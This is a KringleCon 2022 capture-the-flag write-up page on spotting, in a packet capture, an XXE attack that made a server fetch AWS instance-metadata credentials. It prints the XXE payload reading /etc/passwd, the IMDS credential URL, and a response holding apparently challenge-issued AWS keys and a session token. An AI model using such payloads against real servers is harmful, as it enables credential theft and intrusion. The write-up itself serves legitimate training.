@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>3.4 IMDS XXE and Other Abbreviations - alt3kx KringleCon 2022 Write-Up</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+        <link href="../../css/print-site-enum-headings2.css" rel="stylesheet" />
+        <link href="../../css/print-site-enum-headings3.css" rel="stylesheet" />
+        <link href="../../css/print-site-enum-headings4.css" rel="stylesheet" />
+        <link href="../../css/print-site-enum-headings5.css" rel="stylesheet" />
+        <link href="../../css/print-site-enum-headings6.css" rel="stylesheet" />
+        <link href="../../css/print-site.css" rel="stylesheet" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "3.4 IMDS XXE and Other Abbreviations";
+        var mkdocs_page_input_path = "Objectives/3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <script src="../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../../index.html" class="icon icon-home"> alt3kx KringleCon 2022 Write-Up
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../index.html">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">0. KringleCon Orientation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/01_Talk_to_Jingle_Ringford.html">01. Talk to Jingle Ringford</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/02_Get_your_badge.html">02. Get your badge</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/03_Create_a_wallet.html">03. Create a wallet</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/04_Use_the_terminal.html">04. Use the terminal</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../0_KringleCon_Orientation/05_Talk_to_Santa.html">05. Talk to Santa</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">1. Recover the Tolkien Ring</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.1_Wireshark_Practice.html">1.1 Wireshark Practice</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.2_Find_the_Next_Objective.html">1.2 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html">1.3 Windows Event Logs</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.4_Find_the_Next_Objective.html">1.4 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html">1.5 Suricata_Regatta</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">2. Recover the Elfen Ring</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html">2.1 Clone with a Diference</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.2_Find_the_Next_Objective.html">2.2 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.3_Prison_Escape.html">2.3 Prison Escape</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.4_Find_the_Next_Objective.html">2.4 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../2_Recover_the_Elfen_Ring/2.5_Jolly_CI_CD.html">2.5 Jolly CI/CD</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">3. Recover the Web Ring</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="3.1_Naughty_IP.html">3.1 Naught IP</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="3.2_Credential_Mining.html">3.2 Credential Mining</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="3.3_404_FTW.html">3.3 404 FTW</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="3.4_IMDS_XXE_and_Other_Abbreviations.html">3.4 IMDS XXE and Other Abbreviations</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#34-imds-xxe-and-other-abbreviations">3.4 IMDS, XXE, and Other Abbreviations</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#hints">Hint(s)</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#solve">Solve</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#terminal-answers">Terminal answers</a>
+    </li>
+        </ul>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="3.5_Find_the_Next_Objective.html">3.5 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="3.6_Open_Boria_Mine_Door.html">3.6 Open Boria Mine Door</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="3.7_Find_the_Next_Objective.html">3.7 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="3.8_Glamtariel_s_Fountain.html">3.8 Glamtariel's Fountain</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">4. Recover the Cloud Ring</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../4_Recover_the_Cloud_Ring/4.1_AWS_CLI_Intro.html">4.1 AWS CLI_Intro</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../4_Recover_the_Cloud_Ring/4.2_Find_the_Next_Objective.html">4.2 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../4_Recover_the_Cloud_Ring/4.3_Trufflehog_Search.html">4.3 Trufflehog Search</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../4_Recover_the_Cloud_Ring/4.4_Find_the_Next_Objective.html">4.4 Find the Next Objective</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../4_Recover_the_Cloud_Ring/4.5_Exploitation_via_AWS_CLI.html">4.5 Exploitation via AWS CLI</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">5. Recover the Burning Ring of Fire</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html">5.1 Buy a Hat</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../5_Recover_the_Burning_Ring_of_Fire/5.2_Blockchain_Divination.html">5.2 Blockchain Divination</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html">5.3 Exploit a Smart Contract</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">6. Finale</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../6_Finale/6.1_Finale.html">6.1 Finale and Roll Credits</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">alt3kx KringleCon 2022 Write-Up</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../index.html" class="icon icon-home" alt="Docs"></a> &raquo;</li>
+          <li>3. Recover the Web Ring &raquo;</li>
+      <li>3.4 IMDS XXE and Other Abbreviations</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="recover-the-web-ring">Recover the Web Ring</h1>
+<h2 id="34-imds-xxe-and-other-abbreviations">3.4 IMDS, XXE, and Other Abbreviations</h2>
+<p><img src="img/3.4_IMDS_XXE_and_Other_Abbreviations.png"></p>
+<p>The last step in this attack was to use XXE https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing to get secret keys from the IMDS service. What URL did the attacker force the server to fetch?</p>
+<h2 id="hints">Hint(s)</h2>
+<p><img src="img/3.4_hint1.png"></p>
+<h2 id="solve">Solve</h2>
+<pre><code class="language-ruby">ANSWER: http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 
+</code></pre>
+<h3 id="terminal-answers">Terminal answers</h3>
+<p>1.- See pcap filter by protocol observe in detail the request with HTTP/XML</p>
+<pre><code class="language-ruby">http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+
+GET /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.0
+Host: 169.254.169.254
+Accept-Encoding: gzip
+
+HTTP/1.0 200 OK
+Accept-Ranges: bytes
+Content-Length: 1514
+Content-Type: text/plain
+Date: Wed, 05 Oct 2022 16:48:57 GMT
+Last-Modified: Wed, 05 Oct 2022 16:42:35 GMT
+Connection: close
+Server: EC2ws
+
+{
+  &quot;Code&quot; : &quot;Success&quot;,
+  &quot;LastUpdated&quot; : &quot;2022-10-05T16:43:21Z&quot;,
+  &quot;Type&quot; : &quot;AWS-HMAC&quot;,
+  &quot;AccessKeyId&quot; : &quot;ASIAV4AVRXQVJ267LD2Q&quot;,
+  &quot;SecretAccessKey&quot; : &quot;OpGR4v70ygZ3RFf4WTzjNL45pQayRwZgBUgd0LJT&quot;,
+  &quot;Token&quot; : &quot;IQoJb3JpZ2luX2VjECEaCXVzLWVhc3QtMiJHMEUCIHDsZXiUuHIUrLNH5pAeMiv4aUMVIScjwbo1E9LctQ3rAiEA819eJ24mILbxM3eELK2xrgskHxsRmrza/jIj3y96/sgqsgQI2v//////////ARADGgw0MDM3NzIxMjgyOTgiDMAdG5EGamJ4Z2FwyiqGBPy+CL9AfXIGfLBBDCNkCyl5WOMN7owHr84k+hz4XZYBUp7/+KFZgEiKARroMuD6ofdNRvAj7dQ1/wFxeR6wezUPUkHqtc303oTBY7eTk5EQXClpKsmV1l25QAfD0DOL6FPxpjLPug0AbDFlIhjUeImvk3NBWiUHtXptrJH2ksSaQqU2DBPkkQ4IjMBMbLj0ZdJVWaiUy9sf5ecc2d/qVQU1c6SrYLg0HpyuH9brqm0zuv8/tR17Y/Jo2aNeNGX1wvyb5jP1FcQteypV6IqKIUUCADJ7chYeMypMlwV77phvrZco921O6MV+JlhSIomuzFRLdvzD+RP8DyLZeYZ65vKzr6h0yc+XIHOCT+P01pWQgfZBtvfCJKLKqwTMEbIr/i/xgGmHoCTzx6m38kd4EZvGXZMp3EEasdnqTtKLOR6JFAAlW8SoxOKRL1MshK3SUmYvWnMoLKCotPwyJeAMHEHuZipNMiZ2gbN//PMbUBnPjNVFBP4SfHaTv7EHzHNpTl5toy8qlPyxE0yLbh5a//DF5wJQE6UKfXWlQhk9/NVM7QAAzEzWPiFTp8ajRIDjPoprVlX3yUaTUHOH8PwMtURCJLl0sOQaJtRGWEMrH52ls5e83pm0ta8257vu8HyTR7zgc/7a0ZsoxetlsB7VYIKyXnETO7SMniTO8R/yE1Wn9qAoWp/jMPvn9pkGOo8CLegclGA49hB/LRr/V1bXEyIIRg5Zn93xXvccMX5QyKGVSRghNOVGn/cCglDWc9zSRFRlZ4tHblVi1v8021J04REPR69FDuVvpUzEDJfDF1u4XwYGsp7uuuIngiiegP56H5nSYjmpBfyIURwgNvsz6ptpUvplGCxOvBJcKeyborHJDKG40QRXsLpOgB8NTKhgaFNxO7PjA/YrT7g1rYS7xNrKzVIK4tTwxWB5zN5JAQ3pVRp2JB8Q1ng3qsj3UPfZ3O3JjY4U+rrBKPEHIw9B+Pz6kffOu73aPKgo333w/hd9U4slj74JQXPhO9jCYpAF1bLdS/If20Ed6HvGcAONep0A/FrtZ62EWX4HmeYZ4A==&quot;,
+  &quot;Expiration&quot; : &quot;2022-10-05T23:00:40Z&quot;
+  ```
+
+Extra info attacker: 
+
+```ruby
+POST /proc HTTP/1.1
+Host: www.toteslegit.us
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.37) Gecko/20100101 Firefox/12.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: SiteCookie=eyJjb21wYW55IjoiTGVnaXRCcmVhZCIsImxldmVsIjoiYWRtaW4iLCJ1c2VyIjoiYm9iIn0.Yz21Ew.idT7R5CEcAB_uJD221WwmKYG5QM
+Content-Type: application/xml
+Content-Length: 146
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.8.10
+Date: Wed, 05 Oct 2022 16:48:32 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1875
+Connection: close
+
+&lt;html&gt;&lt;body&gt;
+&lt;pre&gt;&lt;foo&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+&lt;/foo&gt;&lt;/pre&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+attacker 18.222.86.32
+</code></pre>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="3.3_404_FTW.html" class="btn btn-neutral float-left" title="3.3 404 FTW"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="3.5_Find_the_Next_Objective.html" class="btn btn-neutral float-right" title="3.5 Find the Next Objective">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="3.3_404_FTW.html" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="3.5_Find_the_Next_Objective.html" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '../..';</script>
+    <script src="../../js/theme_extra.js" defer></script>
+    <script src="../../js/theme.js" defer></script>
+      <script src="../../js/print-site.js" defer></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+      <script src="../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
